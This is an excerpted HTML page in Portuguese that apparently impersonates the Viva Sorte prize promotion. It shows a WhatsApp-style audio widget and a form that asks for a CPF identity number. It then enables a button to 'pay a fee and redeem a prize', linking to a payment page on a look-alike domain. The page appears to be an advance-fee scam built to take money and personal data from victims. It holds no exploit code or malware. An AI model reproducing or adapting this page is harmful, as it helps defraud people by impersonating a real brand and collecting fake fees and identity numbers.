...
<head>
    ...
    <style>
        .escondeer { display: none; }
        .esconder-btn { display: none; }
        .audio-whats {
    ...
    <noscript>
        <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=774564267570472&ev=PageView&noscript=1" />
    </noscript>
    <!-- End Meta Pixel Code -->
</head>
...
<body>
    ...
    <div class="container-principal">
            ...
            <div class="d-flex flex-column justify-content-between w-100" style="margin-left: 0.5rem;">
                <div class="d-flex align-items-center">
                    ...
                    <div class="audio-whats-line">
                        <div class="audio-whats-progress"></div>
                    </div>
                </div>
        ...
        <a href="https://pay.seustitulosvivasorte.com/q510ZOYmb54gE9D">
            <button type="submit" id="btn-submit" class="adc-carrinho esconder" disabled><i class="bi bi-check"></i>PAGAR TAXA E RESGATAR PRÊMIO!</button>
        </a>
    </div>

    <div class="rodape">
        <div class="container-principal">
            <img class="logo-rodape" src="img/logo.png" alt="Logo Rodapé">
            ...
            <div class="patterns-rodape">
                <div class="pattern-rodape">
                    ...
                    <img src="img/viacap.png" alt="Via Cap">
                </div>

                <div class="pattern-rodape">
                    Promoção realizada por:
                    <img src="img/viva.png" alt="Viva">
                </div>

                <div class="pattern-rodape">
                    Desenvolvimento:
                    <img src="img/edjdigital.png" alt="EDJ Digital">
                </div>
            </div>
        </div>
    </div>
    ...
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            ...
            inputCPF.addEventListener('input', function () {
                btnSubmit.disabled = inputCPF.value.trim() === '';
            });
        });
    </script>
